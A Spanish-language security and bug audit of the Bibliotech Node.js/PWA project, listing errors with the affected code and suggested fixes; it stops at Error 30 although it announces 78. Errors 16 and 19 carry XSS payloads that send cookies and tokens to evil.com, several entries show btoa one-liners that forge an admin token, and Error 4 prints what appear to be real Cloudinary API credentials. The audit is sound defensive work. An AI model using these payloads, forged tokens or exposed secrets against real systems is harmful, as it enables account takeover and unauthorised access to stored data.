# 📋 Listado de Errores Detectados — Proyecto Bibliotech

> **Fecha:** 2026-08-04  
> **Total de errores:** 78  
> **Alcance:** Backend (Node.js/Express/Sequelize) + Frontend (HTML/CSS/JS/PWA)  
> **Estado:** Solo identificación — No se han aplicado correcciones

---

## Tabla de Contenidos

| Categoría | Cantidad | Rango |
|---|---|---|
| 🔴 Críticos / Seguridad | 24 | 1–24 |
| 🟠 Graves / Funcionales | 30 | 25–54 |
| 🟡 Moderados / Arquitectura | 12 | 55–66 |
| 🟢 Leves / HTML-PWA | 12 | 67–78 |

---

## 🔴 CRÍTICOS / SEGURIDAD (Errores 1–24)

---

### Error 1 — Token de autenticación falsificable (base64 sin firma)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Autenticación  
- **Archivo:** `backend/src/middleware/auth.js`  
- **Función:** `authenticate()` — líneas 6–31 (línea clave: 17)  
- **Código afectado:**
```js
// Línea 17
decoded = JSON.parse(Buffer.from(token, "base64").toString("utf-8"));
```

**Descripción y Justificación técnica:**  
El token de autenticación es simplemente un `Buffer.from(JSON.stringify({id, email, role})).toString("base64")`. No usa JWT ni ninguna firma criptográfica. Cualquier usuario puede crear un token válido manualmente con `btoa(JSON.stringify({id:1, role:"admin"}))` en la consola del navegador. No hay expiración ni verificación de firma. Esto permite suplantación total de identidad y escalada de privilegios.

**Solución sugerida:**
```bash
npm install jsonwebtoken
```
```js
// backend/src/services/auth.js — generateToken
const jwt = require("jsonwebtoken");
const SECRET = process.env.JWT_SECRET || "cambiar-en-produccion";

static generateToken(payload) {
  return jwt.sign(payload, SECRET, { expiresIn: "7d" });
}

// backend/src/services/auth.js — verifyToken
static verifyToken(token) {
  try {
    return jwt.verify(token, SECRET);
  } catch {
    return null;
  }
}

// backend/src/middleware/auth.js — authenticate (línea 17)
const decoded = jwt.verify(token, process.env.JWT_SECRET);
```

---

### Error 2 — Login no devuelve token al frontend

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Funcional  
- **Archivo:** `backend/src/controllers/auth.js`  
- **Función:** `login()` — líneas 113–120  
- **Código afectado:**
```js
// Líneas 113-120
return res.status(200).json({
  success: true,
  message: "Login exitoso",
  data: {
    id: user.id,
    name: user.name,
    email: user.email,
    role: user.role,
    // ❌ Falta el token
  },
});
```

**Descripción y Justificación técnica:**  
El controlador `login()` retorna `{id, name, email, role}` pero NO incluye el `token`. El frontend espera `data.token` para guardarlo en `localStorage`. Como el backend no lo envía, el frontend genera un token falso con `btoa()` (ver Error 15). El `AuthService.login()` sí genera el token correctamente, pero el controlador no lo usa.

**Solución sugerida:**
```js
// backend/src/controllers/auth.js — login()
const AuthService = require("../services/auth");
// ... validación de credenciales ...
const token = AuthService.generateToken({
  id: user.id,
  email: user.email,
  role: user.role,
});

return res.status(200).json({
  success: true,
  message: "Login exitoso",
  data: {
    id: user.id,
    name: user.name,
    email: user.email,
    role: user.role,
    token, // ✅ Token incluido
  },
});
```

---

### Error 3 — SUPABASE_SERVICE_ROLE_KEY hardcodeada como fallback

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Credenciales expuestas  
- **Archivo:** `backend/src/config/supabase.js`  
- **Líneas:** 9–12  
- **Código afectado:**
```js
// Líneas 9-12
const supabase = createClient(
  process.env.SUPABASE_URL || "https://xxx.supabase.co",
  process.env.SUPABASE_SERVICE_ROLE_KEY || "eyJhbGciOiJIUzI1NiIsInR5cCI6..."
);
```

**Descripción y Justificación técnica:**  
La `SUPABASE_SERVICE_ROLE_KEY` es la clave de servicio de Supabase que tiene acceso total a la base de datos y storage, saltando todas las políticas RLS (Row Level Security). Está hardcodeada como fallback en el código fuente. Si el repositorio es público en GitHub, cualquier persona puede verla y usarla para acceder a toda la base de datos. Esta clave NUNCA debe estar en el código.

**Solución sugerida:**
```js
// backend/src/config/supabase.js
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

if (!supabaseUrl || !supabaseKey) {
  throw new Error("Faltan variables de entorno: SUPABASE_URL y SUPABASE_SERVICE_ROLE_KEY");
}

const supabase = createClient(supabaseUrl, supabaseKey);
module.exports = supabase;
```

---

### Error 4 — Credenciales de Cloudinary hardcodeadas en código fuente

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Credenciales expuestas  
- **Archivo:** `backend/src/config/cloudinary.js`  
- **Líneas:** 5–9  
- **Código afectado:**
```js
// Líneas 5-9
cloudinary.config({
  cloud_name: "ditggsmd",
  api_key: "878829813274737",
  api_secret: "yO3x3WrCQ7MwDgLMgz5-aAemoYs",
});
```

**Descripción y Justificación técnica:**  
El `api_secret` de Cloudinary está hardcodeado en el código fuente. Con esta clave, cualquier persona puede subir, modificar o eliminar archivos del almacenamiento de Cloudinary. Aunque el archivo no se importa actualmente (código muerto), las credenciales siguen visibles en el repositorio. Además, estas credenciales deberían rotarse inmediatamente por haber estado expuestas.

**Solución sugerida:**
```js
// backend/src/config/cloudinary.js (si se vuelve a usar)
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

// Y eliminar el archivo si no se usa, o rotar las claves en el panel de Cloudinary
```

---

### Error 5 — Rutas de usuario completamente públicas (sin autenticación)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Control de acceso  
- **Archivo:** `backend/src/routes/user/index.js`  
- **Líneas:** 1–20  
- **Código afectado:**
```js
// Líneas 1-20 — Sin ningún middleware authenticate
router.get("/", controller.getUsers);
router.get("/:id", controller.getUserById);
router.post("/", controller.createUser);
router.put("/:id", controller.updateUser);
router.delete("/:id", controller.deleteUser);
```

**Descripción y Justificación técnica:**  
Todas las rutas CRUD de usuarios (`GET /`, `GET /:id`, `POST /`, `PUT /:id`, `DELETE /:id`) son completamente públicas. No tienen middleware `authenticate` ni `authorize`. Cualquier persona sin autenticación puede: listar todos los usuarios, ver datos de cualquier usuario, crear usuarios nuevos, modificar cualquier usuario (incluyendo cambiar roles) y eliminar cualquier usuario. Esto es una vulnerabilidad crítica de control de acceso.

**Solución sugerida:**
```js
// backend/src/routes/user/index.js
const { authenticate, authorize } = require("../../middleware/auth");

// Todas las rutas requieren autenticación
router.use(authenticate);

// Solo admin puede listar y ver todos los usuarios
router.get("/", authorize("admin"), controller.getUsers);
router.get("/:id", authorize("admin"), controller.getUserById);

// Solo admin puede crear usuarios desde este endpoint
router.post("/", authorize("admin"), controller.createUser);

// El propio usuario o admin puede actualizar
router.put("/:id", controller.updateUser);
router.delete("/:id", authorize("admin"), controller.deleteUser);
```

---

### Error 6 — Escalada de rol en updateUser (no excluye campo `role`)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Escalada de privilegios  
- **Archivo:** `backend/src/services/users.js`  
- **Función:** `updateUser()` — líneas 35–45  
- **Código afectado:**
```js
// Líneas 35-45
static async updateUser(id, data) {
  const user = await User.findByPk(id);
  if (!user) return null;
  await user.update(data); // ❌ Pasa data directo, incluye 'role'
  return user;
}
```

**Descripción y Justificación técnica:**  
La función `updateUser()` pasa `data` directamente a `user.update(data)` sin filtrar el campo `role`. Combinado con el Error 5 (rutas públicas), cualquier usuario puede enviar `PUT /api/user/1` con `{"role":"admin"}` y escalar privilegios a administrador. Incluso con autenticación, un usuario normal podría cambiar su propio rol a `admin` o `escritor`.

**Solución sugerida:**
```js
// backend/src/services/users.js — updateUser
static async updateUser(id, data) {
  const user = await User.findByPk(id);
  if (!user) return null;

  // Excluir campos sensibles del update
  const { role, password, id: _id, ...safeData } = data;
  await user.update(safeData);
  return user;
}
```

---

### Error 7 — Descarga de PDF pública sin autenticación

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Control de acceso  
- **Archivo:** `backend/src/routes/books/index.js`  
- **Línea:** ~55  
- **Código afectado:**
```js
// Línea ~55
router.get("/:id/download", downloadBookPDF); // ❌ Sin authenticate
```

**Descripción y Justificación técnica:**  
La ruta `GET /api/books/:id/download` no tiene middleware `authenticate`. Cualquier persona, sin estar logueada, puede descargar los PDFs de cualquier libro. Si los libros tienen derechos de autor o son contenido premium, esto permite acceso no autorizado masivo. Además, el endpoint actúa como proxy del servidor, lo que significa que consume ancho de banda del servidor sin control.

**Solución sugerida:**
```js
// backend/src/routes/books/index.js
router.get("/:id/download", authenticate, downloadBookPDF);
```

---

### Error 8 — download.js establece CORS `*` manualmente (bypass de política CORS)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / CORS  
- **Archivo:** `backend/src/controllers/download.js`  
- **Línea:** ~145  
- **Código afectado:**
```js
// Línea ~145
res.setHeader('Access-Control-Allow-Origin', '*');
```

**Descripción y Justificación técnica:**  
El controlador `downloadBookPDF` establece manualmente `Access-Control-Allow-Origin: *`, sobreescribiendo la política CORS configurada en `app.js` que restringe orígenes. Esto permite que cualquier sitio web externo incruste iframes o haga peticiones de descarga, eludiendo la protección CORS. Combinado con `credentials: true` en la config global, puede causar conflictos de CORS.

**Solución sugerida:**
```js
// backend/src/controllers/download.js
// Eliminar la línea: res.setHeader('Access-Control-Allow-Origin', '*');
// Dejar que el middleware CORS global maneje los headers.
// Si se necesita un origen específico:
const allowedOrigins = [
  "https://tercero-sofware.vercel.app",
  "http://localhost:5500",
];
const origin = req.headers.origin;
if (allowedOrigins.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
```

---

### Error 9 — Sin middleware de manejo de errores global

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Robustez  
- **Archivo:** `backend/src/app.js`  
- **Líneas:** 63–67  
- **Código afectado:**
```js
// Líneas 63-67 — Solo hay handler 404, no hay handler de errores
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: "Ruta no encontrada",
  });
});
// ❌ Falta: app.use((err, req, res, next) => { ... });
```

**Descripción y Justificación técnica:**  
No existe un middleware de manejo de errores global `(err, req, res, next)`. Cuando un error no capturado ocurre (ej: crash en Sequelize, timeout de Supabase, error de parsing), Express devuelve el stack trace completo al cliente, exponiendo información sensible como rutas de archivos, variables internas y estructura del código. Esto facilita ataques y depuración por parte de atacantes.

**Solución sugerida:**
```js
// backend/src/app.js — Después del handler 404
app.use((err, req, res, next) => {
  console.error("❌ Error no controlado:", err);
  res.status(err.status || 500).json({
    success: false,
    message: process.env.NODE_ENV === "production"
      ? "Error interno del servidor"
      : err.message,
  });
});
```

---

### Error 10 — CORS permite peticiones sin header Origin

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / CORS  
- **Archivo:** `backend/src/app.js`  
- **Línea:** 25  
- **Código afectado:**
```js
// Línea 25
if (!origin || allowedOrigins.includes(origin)) {
  return callback(null, true);
}
```

**Descripción y Justificación técnica:**  
La condición `!origin` permite peticiones sin header `Origin`. Aunque esto se hace comúnmente para permitir herramientas como curl o Postman, en producción permite que cualquier script server-side (bots, scrapers) acceda a la API sin restricciones de CORS. Los navegadores siempre envían `Origin` en peticiones cross-origin, por lo que `!origin` solo beneficia a herramientas no-navegador, que son exactamente las que deberían estar autenticadas.

**Solución sugerida:**
```js
// backend/src/app.js — línea 25
origin: function (origin, callback) {
  // En desarrollo, permitir sin origin; en producción, exigirlo
  if (process.env.NODE_ENV !== "production" && !origin) {
    return callback(null, true);
  }
  if (!origin || !allowedOrigins.includes(origin)) {
    return callback(new Error("No permitido por CORS"));
  }
  return callback(null, true);
}
```

---

---

### Error 11 — verifyToken no verifica firma criptográfica

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Autenticación  
- **Archivo:** `backend/src/services/auth.js`  
- **Función:** `verifyToken()` — líneas 86–93  
- **Código afectado:**
```js
// Líneas 86-93
static verifyToken(token) {
  try {
    const decoded = JSON.parse(
      Buffer.from(token, "base64").toString("utf-8")
    );
    return decoded;
  } catch {
    return null;
  }
}
```

**Descripción y Justificación técnica:**  
`verifyToken()` solo decodifica base64, no verifica ninguna firma. Cualquier token fabricado con `btoa(JSON.stringify({id:1, role:"admin"}))` pasará la verificación como válido. No hay expiración ni validación de integridad. Esto invalida completamente el sistema de autenticación: el "verify" es cosmético.

**Solución sugerida:**
```js
// backend/src/services/auth.js
const jwt = require("jsonwebtoken");
const SECRET = process.env.JWT_SECRET;

static verifyToken(token) {
  try {
    return jwt.verify(token, SECRET);
  } catch {
    return null;
  }
}
```

---

### Error 12 — changePassword usa bcrypt.hash directo (no usa utils/password.js)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Consistencia  
- **Archivo:** `backend/src/controllers/user.js`  
- **Función:** `changePassword()` — línea ~250  
- **Código afectado:**
```js
// Línea ~250
const hashedPassword = await bcrypt.hash(newPassword, 10);
```

**Descripción y Justificación técnica:**  
`changePassword()` usa `bcrypt.hash` directamente con salt rounds de 10, en lugar de usar `utils/password.js` que probablemente centraliza la lógica de hashing. Esto crea inconsistencia: si se cambia el algoritmo o salt rounds en `utils/password.js`, los passwords cambiados aquí no se actualizarán, causando fallos de login futuros. Además, no valida la contraseña actual antes de cambiarla.

**Solución sugerida:**
```js
// backend/src/controllers/user.js
const { hashPassword, comparePassword } = require("../utils/password");

// En changePassword():
const isMatch = await comparePassword(currentPassword, user.password);
if (!isMatch) {
  return res.status(400).json({ success: false, message: "Contraseña actual incorrecta" });
}
const hashedPassword = await hashPassword(newPassword);
```

---

### Error 13 — updateProfile no verifica unicidad de email

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Integridad de datos  
- **Archivo:** `backend/src/controllers/user.js`  
- **Función:** `updateProfile()` — líneas ~170–195  
- **Código afectado:**
```js
// Líneas ~170-195 — No verifica si el email ya existe en otro usuario
await user.update({ name, email });
```

**Descripción y Justificación técnica:**  
`updateProfile()` permite cambiar el email sin verificar si ya está en uso por otro usuario. Esto puede causar: 1) Emails duplicados en la base de datos (si no hay constraint UNIQUE), 2) Confusión de identidad — dos usuarios con el mismo email, 3) Posible toma de cuenta si el login usa email. El login por email encontraría el primer match, bloqueando al usuario legítimo.

**Solución sugerida:**
```js
// backend/src/controllers/user.js — updateProfile
if (email && email !== user.email) {
  const existing = await User.findOne({ where: { email } });
  if (existing) {
    return res.status(409).json({
      success: false,
      message: "El email ya está registrado por otro usuario",
    });
  }
}
await user.update({ name, email });
```

---

### Error 14 — cloudinary.js expone credenciales aunque es código muerto

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Credenciales expuestas  
- **Archivo:** `backend/src/config/cloudinary.js`  
- **Descripción y Justificación técnica:**  
El archivo `cloudinary.js` no es importado por ningún módulo del proyecto (código muerto), pero contiene credenciales hardcodeadas (ver Error 4). Aunque no se ejecute, las credenciales están visibles en el repositorio Git. Cualquier persona con acceso al repo puede verlas y usarlas. El archivo debe eliminarse o, si se planea usar Cloudinary, debe usar variables de entorno.

**Solución sugerida:**
```bash
# Opción 1: Eliminar el archivo si no se usa
rm backend/src/config/cloudinary.js

# Opción 2: Si se va a usar, reescribir con env vars (ver Error 4)
# Y rotar las claves expuestas en el panel de Cloudinary inmediatamente
```

---

### Error 15 — Frontend genera token falso con btoa()

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Autenticación  
- **Archivo:** `frontend/js/login.js`  
- **Líneas:** 120–135  
- **Código afectado:**
```js
// Líneas 120-135
const token = btoa(JSON.stringify({
  id: data.id,
  email: data.email,
  role: data.role,
}));
localStorage.setItem("token", token);
```

**Descripción y Justificación técnica:**  
Como el backend no devuelve un token real (Error 2), el frontend lo fabrica con `btoa()`. Este token es trivialmente falsificable: cualquier usuario puede abrir la consola y ejecutar `localStorage.setItem("token", btoa(JSON.stringify({id:1, role:"admin"})))` para obtener acceso de administrador. El frontend nunca debería generar tokens de autenticación; debe recibirlos del backend.

**Solución sugerida:**
```js
// frontend/js/login.js — Después de corregir Error 2 (backend devuelve token)
const token = data.token; // Token real del backend
if (!token) {
  throw new Error("El servidor no devolvió un token");
}
localStorage.setItem("token", token);
```

---

### Error 16 — XSS en renderBooks() (innerHTML sin escapar)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / XSS  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `renderBooks()`  
- **Código afectado:**
```js
// book.nombre y book.autor insertados en innerHTML sin escapar
card.innerHTML = `<h3>${book.nombre}</h3><p>${book.autor}</p>`;
```

**Descripción y Justificación técnica:**  
Los campos `book.nombre` y `book.autor` se insertan directamente en `innerHTML` sin sanitización. Si un usuario malintencionado registra un libro con nombre como `<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">`, el código se ejecutará en el navegador de cualquier usuario que vea la lista de libros. Esto permite robo de sesión, redirección a sitios maliciosos y ejecución de código arbitrario.

**Solución sugerida:**
```js
// frontend/js/books.js — Crear función de escape
function escapeHtml(str) {
  const div = document.createElement("div");
  div.textContent = str ?? "";
  return div.innerHTML;
}

// En renderBooks():
card.innerHTML = `<h3>${escapeHtml(book.nombre)}</h3><p>${escapeHtml(book.autor)}</p>`;
```

---

### Error 17 — XSS en renderFilterTags() (${cat} en innerHTML)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / XSS  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `renderFilterTags()`  
- **Código afectado:**
```js
tag.innerHTML = `<span>${cat}</span>`;
```

**Descripción y Justificación técnica:**  
El valor `${cat}` (categoría) se inserta en `innerHTML` sin escapar. Aunque las categorías actualmente son hardcoded (Error 54), si en el futuro se permiten categorías dinámicas desde el backend, un atacante podría inyectar una categoría con script malicioso. Es una vulnerabilidad latente que debe corregirse preventivamente.

**Solución sugerida:**
```js
tag.innerHTML = `<span>${escapeHtml(cat)}</span>`;
// Usar la misma función escapeHtml() definida en Error 16
```

---

### Error 18 — XSS en loadPendingBooks() (múltiples campos sin escapar)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / XSS  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `loadPendingBooks()`  
- **Código afectado:**
```js
// book.foto, book.nombre, book.autor, etc. en innerHTML sin escapar
item.innerHTML = `<img src="${book.foto}"><h3>${book.nombre}</h3>...`;
```

**Descripción y Justificación técnica:**  
Múltiples campos del libro (`foto`, `nombre`, `autor`, etc.) se insertan en `innerHTML` sin sanitización en la vista de moderación. Un usuario que sube un libro pendiente de aprobación puede inyectar scripts que se ejecutarán en el navegador del moderador o administrador. Esto es especialmente grave porque afecta al panel de moderación, donde el atacante sabe que el contenido lo verá un admin.

**Solución sugerida:**
```js
item.innerHTML = `
  <img src="${escapeHtml(book.foto)}" alt="">
  <h3>${escapeHtml(book.nombre)}</h3>
  <p>${escapeHtml(book.autor)}</p>
`;
// Usar escapeHtml() para todos los campos dinámicos
```

---

### Error 19 — XSS en loadWriterRequests() (fullName, email, currentRole sin escapar)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / XSS  
- **Archivo:** `frontend/js/books.js`  
- **Función:** `loadWriterRequests()`  
- **Código afectado:**
```js
// fullName, email, currentRole en innerHTML sin escapar
row.innerHTML = `<td>${req.fullName}</td><td>${req.email}</td>...`;
```

**Descripción y Justificación técnica:**  
Los campos `fullName`, `email` y `currentRole` de las solicitudes de escritor se insertan en `innerHTML` sin escapar. Un usuario puede registrar su nombre como `<script>document.location='https://evil.com?token='+localStorage.token</script>` y cuando el admin revise las solicitudes, su token se enviará al atacante. Es un vector de robo de sesión dirigido al administrador.

**Solución sugerida:**
```js
row.innerHTML = `
  <td>${escapeHtml(req.fullName)}</td>
  <td>${escapeHtml(req.email)}</td>
  <td>${escapeHtml(req.currentRole)}</td>
`;
```

---

### Error 20 — XSS en showNotification() (${message} en innerHTML)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / XSS  
- **Archivo:** `frontend/js/settings.js`  
- **Función:** `showNotification()`  
- **Código afectado:**
```js
notification.innerHTML = `<p>${message}</p>`;
```

**Descripción y Justificación técnica:**  
El parámetro `message` se inserta en `innerHTML` sin escapar. Si `message` proviene de una respuesta del servidor que incluye datos de usuario no sanitizados, un atacante podría inyectar HTML/script. Aunque actualmente los mensajes parecen ser strings hardcoded, es una mala práctica que puede volverse explotable si los mensajes empiezan a incluir contenido dinámico.

**Solución sugerida:**
```js
notification.textContent = message; // ✅ textContent no interpreta HTML
// O si se necesita HTML controlado:
notification.innerHTML = `<p>${escapeHtml(message)}</p>`;
```

---

### Error 21 — XSS en setUploadStatus() y showServerError() (${message} en innerHTML)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / XSS  
- **Archivo:** `frontend/js/books.js`  
- **Funciones:** `setUploadStatus()` y `showServerError()`  
- **Código afectado:**
```js
// setUploadStatus()
statusEl.innerHTML = `<span>${message}</span>`;

// showServerError()
errorEl.innerHTML = `<p>${message}</p>`;
```

**Descripción y Justificación técnica:**  
Ambas funciones insertan `message` en `innerHTML` sin escapar. Si los mensajes de error del servidor contienen datos ingresados por usuarios (ej: "El libro 'nombre' ya existe"), y el nombre contiene HTML, se ejecutará como script. Los mensajes de error del backend frecuentemente incluyen datos del usuario, por lo que el riesgo es real.

**Solución sugerida:**
```js
// setUploadStatus()
statusEl.textContent = message;

// showServerError()
errorEl.textContent = message;
// O con escapeHtml():
errorEl.innerHTML = `<p>${escapeHtml(message)}</p>`;
```

---

### Error 22 — authFetch no maneja respuestas 401 (tokens expirados)

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / UX / Sesión  
- **Archivo:** `frontend/js/api.js`  
- **Líneas:** 45–55  
- **Código afectado:**
```js
// Líneas 45-55
async function authFetch(url, options = {}) {
  const token = localStorage.getItem("token");
  if (token) {
    options.headers = { ...options.headers, Authorization: `Bearer ${token}` };
  }
  const res = await fetch(url, options);
  return res; // ❌ No detecta 401
}
```

**Descripción y Justificación técnica:**  
`authFetch()` no detecta respuestas 401 (No Autorizado). Si el token expira o es inválido, el usuario sigue viendo la página como si estuviera logueado, pero todas las peticiones fallan silenciosamente. No hay redirección al login, no hay mensaje de error, no hay limpieza del token expirado. El usuario experimenta un comportamiento errático sin entender por qué.

**Solución sugerida:**
```js
async function authFetch(url, options = {}) {
  const token = localStorage.getItem("token");
  if (token) {
    options.headers = { ...options.headers, Authorization: `Bearer ${token}` };
  }
  const res = await fetch(url, options);

  if (res.status === 401) {
    localStorage.removeItem("token");
    localStorage.removeItem("user");
    window.location.href = "/index.html?expired=1";
    throw new Error("Sesión expirada");
  }
  return res;
}
```

---

### Error 23 — Service Worker cachea peticiones de API

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / PWA / Datos stale  
- **Archivo:** `frontend/sw.js`  
- **Código afectado:**
```js
// sw.js — Intercepta TODAS las peticiones incluyendo API
self.addEventListener("fetch", (event) => {
  event.respondWith(
    caches.match(event.request).then((cached) => {
      return cached || fetch(event.request);
    })
  );
});
```

**Descripción y Justificación técnica:**  
El Service Worker intercepta todas las peticiones `fetch`, incluyendo las de la API (`/api/*`). Si una respuesta de API se cachea, el usuario verá datos obsoletos (stale) incluso después de que cambien en el servidor. Por ejemplo, si un libro es eliminado o moderado, el usuario seguirá viéndolo. Además, puede cachea respuestas con datos sensibles de usuario en el caché del navegador, accesibles incluso después de logout.

**Solución sugerida:**
```js
self.addEventListener("fetch", (event) => {
  // No cachear peticiones de API ni peticiones POST
  if (event.request.url.includes("/api/") || event.request.method !== "GET") {
    return; // Dejar que vayan a la red
  }
  event.respondWith(
    caches.match(event.request).then((cached) => {
      return cached || fetch(event.request).then((res) => {
        // Solo cachear recursos estáticos
        if (res.ok && res.type === "basic") {
          const clone = res.clone();
          caches.open(CACHE_NAME).then((cache) => cache.put(event.request, clone));
        }
        return res;
      });
    })
  );
});
```

---

### Error 24 — loadCommentsFromAPI y loadSuggestions hacen fetch sin auth headers

- **Severidad:** 🔴 CRÍTICO  
- **Categoría:** Seguridad / Autenticación  
- **Archivo:** `frontend/js/bookDetail.js`  
- **Funciones:** `loadCommentsFromAPI()` y `loadSuggestions()`  
- **Código afectado:**
```js
// loadCommentsFromAPI()
const res = await fetch(`${API_URL}/books/${bookId}/comments`);

// loadSuggestions()
const res = await fetch(`${API_URL}/books/${bookId}/suggestions`);
```

**Descripción y Justificación técnica:**  
Estas funciones usan `fetch()` directo en lugar de `authFetch()`, por lo que no envían el token de autenticación. Si el backend requiere autenticación para ver comentarios o sugerencias, estas peticiones fallarán con 401. Si el backend no requiere auth, cualquiera puede leer comentarios y sugerencias sin estar logueado, lo que puede ser un problema de privacidad según el contexto.

**Solución sugerida:**
```js
// frontend/js/bookDetail.js
const { authFetch } = await import("./api.js");

// loadCommentsFromAPI()
const res = await authFetch(`${API_URL}/books/${bookId}/comments`);

// loadSuggestions()
const res = await authFetch(`${API_URL}/books/${bookId}/suggestions`);
```

---

---

## 🟠 GRAVES / FUNCIONALES (Errores 25–54)

---

### Error 25 — Ruta /user montada dos veces

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Rutas duplicadas  
- **Archivo:** `backend/src/routes/index.js`  
- **Líneas:** 12 y 22  
- **Código afectado:**
```js
// Línea 12
router.use("/user", userRoutes);
// ...
// Línea 22
router.use("/user", userRoutes); // ❌ Duplicado
```

**Descripción y Justificación técnica:**  
La ruta `/user` se monta dos veces en el router principal. Esto causa que cada petición a `/api/user/*` pase por el router dos veces, ejecutando middlewares y handlers duplicados. Puede causar respuestas duplicadas, headers enviados dos veces (`Error: Can't set headers after they are sent`), o comportamiento impredecible. Express no previene esto silenciosamente.

**Solución sugerida:**
```js
// backend/src/routes/index.js — Eliminar la línea 22 (duplicado)
router.use("/user", userRoutes); // Solo una vez
```

---

### Error 26 — ModerationController.getCounts no existe

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Método inexistente  
- **Archivo:** `backend/src/routes/moderation.js`  
- **Línea:** 8  
- **Código afectado:**
```js
// Línea 8
router.get("/counts", ModerationController.getCounts); // ❌ getCounts no existe
```

**Descripción y Justificación técnica:**  
La ruta `GET /api/moderation/counts` referencia `ModerationController.getCounts`, pero este método no está definido en `backend/src/controllers/moderation.js`. Cualquier petición a este endpoint lanzará `TypeError: ModerationController.getCounts is not a function`, causando un crash 500. El frontend que dependa de este endpoint para mostrar contadores de moderación no funcionará.

**Solución sugerida:**
```js
// backend/src/controllers/moderation.js — Añadir el método
static async getCounts(req, res) {
  try {
    const pendingBooks = await Book.count({ where: { status: "pending" } });
    const writerRequests = await WriterRequest.count({ where: { status: "pending" } });
    return res.status(200).json({
      success: true,
      data: { pendingBooks, writerRequests },
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
}
```

---

### Error 27 — Query Sequelize inválida ({ status: { [Op.eq]: undefined } })

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Query rota  
- **Archivo:** `backend/src/controllers/books.js`  
- **Línea:** ~85  
- **Código afectado:**
```js
// Línea ~85
where: { status: { [Op.eq]: undefined } }
```

**Descripción y Justificación técnica:**  
La query usa `[Op.eq]: undefined` que en Sequelize se traduce a `WHERE status = NULL` en algunos casos, o se ignora en otros, dependiendo de la versión. El comportamiento es impredecible: puede retornar todos los libros, ninguno, o lanzar un error. La intención probable era filtrar por libros aprobados (`status: "approved"`), pero `undefined` hace la query inútil.

**Solución sugerida:**
```js
// backend/src/controllers/books.js — línea ~85
where: { status: "approved" } // O el valor correcto según el modelo
```

---

### Error 28 — secure_url vs publicUrl (Cloudinary vs Supabase)

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Integración rota  
- **Archivo:** `backend/src/controllers/books.js`  
- **Líneas:** ~38, ~48, ~175, ~185  
- **Código afectado:**
```js
// Líneas ~38, ~48, ~175, ~185
const fotoUrl = result.secure_url; // ❌ Cloudinary
const archivoUrl = result.secure_url; // ❌ Cloudinary
```

**Descripción y Justificación técnica:**  
El código usa `result.secure_url` que es el formato de respuesta de Cloudinary, pero el proyecto usa Supabase Storage. Supabase retorna `data.publicUrl`, no `secure_url`. Como resultado, `fotoUrl` y `archivoUrl` serán `undefined`, y los libros se guardarán sin URL de imagen ni archivo PDF. Los libros se crearán pero serán inaccesibles.

**Solución sugerida:**
```js
// backend/src/controllers/books.js — Usar formato Supabase
const fotoUrl = result.data.publicUrl;   // Supabase
const archivoUrl = result.data.publicUrl; // Supabase
```

---

### Error 29 — Decodificación manual de token en todos los métodos de user.js

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / DRY / Mantenibilidad  
- **Archivo:** `backend/src/controllers/user.js`  
- **Descripción y Justificación técnica:**  
Cada método del controlador (`getProfile`, `updateProfile`, `changePassword`, etc.) decodifica el token manualmente con `Buffer.from(token, "base64")` en lugar de usar `AuthService.verifyToken()`. Esto duplica lógica, es propenso a errores, y si se cambia el formato del token (Error 1), habrá que modificar cada método individualmente. El middleware `authenticate` ya decodifica y adjunta `req.user`, por lo que la decodificación manual es redundante.

**Solución sugerida:**
```js
// backend/src/controllers/user.js — Usar req.user del middleware authenticate
static async getProfile(req, res) {
  // req.user ya está disponible gracias a authenticate()
  const user = await User.findByPk(req.user.id);
  // ...
}
// Eliminar todas las decodificaciones manuales de token
```

---

### Error 30 — Formato de respuesta inconsistente (no usa wrapper {success, data})

- **Severidad:** 🟠 GRAVE  
- **Categoría:** Funcional / Consistencia API  
- **Archivo:** `backend/src/controllers/index.js`  
- **Líneas:** 1–80  
- **Descripción y Justificación técnica:**  
